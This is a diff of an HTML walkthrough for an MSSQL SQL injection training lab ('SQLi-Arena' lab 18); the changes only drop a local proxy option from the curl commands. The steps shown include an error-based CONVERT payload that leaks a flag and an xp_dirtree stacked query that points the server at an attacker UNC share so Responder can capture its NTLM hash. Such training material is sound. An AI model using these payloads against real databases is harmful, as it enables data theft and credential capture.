@@ -7,7 +7,7 @@
         <span class="terminal-title">Step 1. Normal Search</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab18" \<br> --data-urlencode "q=server"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab18" \<br> --data-urlencode "q=server"<br><br>
         <span class="prompt">Input: </span>server<br>
         <span class="prompt">SQL: </span>SELECT id, asset_name, asset_type, location FROM assets WHERE asset_name LIKE '%server%'<br><br>
         <span class="prompt">Output:</span><br>
@@ -27,7 +27,7 @@
         <span class="terminal-title">Step 2. CONVERT Extraction</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab18" \<br> --data-urlencode "q=' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab18" \<br> --data-urlencode "q=' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br><br>
         <span class="prompt">Input: </span>' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -<br>
         <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the varchar value 'FLAG{ms_ntlm_h4sh_c4ptur3}' to data type int.</strong>
     </div>
@@ -64,7 +64,7 @@
         <span class="terminal-title">Step 4. UNC Path Trigger</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab18" \<br> --data-urlencode "q='; EXEC xp_dirtree '\\10.10.14.5\share'; -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab18" \<br> --data-urlencode "q='; EXEC xp_dirtree '\\10.10.14.5\share'; -- -"<br><br>
         <span class="prompt">Input: </span>'; EXEC xp_dirtree '\\10.10.14.5\share'; -- -<br>
         <span class="prompt">Response: </span>All 8 assets returned (stacked query executes silently, normal results shown)<br><br>
         <span class="prompt">// Responder captures (on attacker machine):</span><br>
@@ -140,7 +140,7 @@
         <span class="terminal-title">curl. Quick Solve</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab18" \<br> --data-urlencode "q=' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab18" \<br> --data-urlencode "q=' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br><br>
         <span class="prompt">Output: </span><strong>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the varchar value 'FLAG{ms_ntlm_h4sh_c4ptur3}' to data type int.</strong>
     </div>
 </div>
